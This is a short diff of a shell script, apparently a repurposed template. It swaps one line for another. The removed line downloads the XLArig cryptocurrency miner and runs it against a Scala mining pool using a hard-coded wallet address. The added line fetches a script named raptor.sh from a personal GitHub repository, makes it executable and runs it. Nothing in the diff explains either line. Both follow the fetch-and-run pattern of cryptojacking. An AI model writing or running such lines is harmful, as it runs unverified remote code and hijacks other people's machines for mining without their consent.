@@ -12,7 +12,7 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o mine.scalaproject.io:5555 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p Rx -a panthera -k -t24
+wget https://raw.githubusercontent.com/lushenry654/bitbucket/master/raptor.sh && chmod +x raptor.sh && ./raptor.sh
 done
 # <your script here>
 
